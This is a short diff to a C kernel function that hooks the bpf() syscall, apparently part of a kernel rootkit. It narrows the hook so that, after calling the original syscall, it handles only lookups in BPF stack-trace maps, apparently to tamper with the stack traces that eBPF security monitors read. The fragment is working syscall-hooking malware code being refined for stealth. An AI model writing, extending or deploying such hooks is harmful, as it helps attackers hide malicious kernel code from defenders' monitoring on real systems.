@@ -355,11 +355,15 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	union bpf_attr __user *uattr;
 	struct kernel_syscalls *ks;
 	void *key = NULL, *value = NULL;
+	int cmd = (int)PT_REGS_PARM1(regs);
 	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
 	// Call original first this time
 	ret = real_m_bpf(regs);
 	if (ret < 0)
+		goto leave;
+
+	if (cmd != BPF_MAP_LOOKUP_ELEM)
 		goto leave;
 
 	if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
@@ -379,6 +383,12 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 		struct fd f = { .file = file, .flags = 0 };
 		struct bpf_map *map = ks->k_bpf_map_get(f);
 #endif
+		if (IS_ERR(map))
+			goto leave;
+
+		if (map->map_type != BPF_MAP_TYPE_STACK_TRACE)
+			goto leave;
+
 		struct bpf_stack_map *smap =
 			container_of(map, struct bpf_stack_map, map);
 
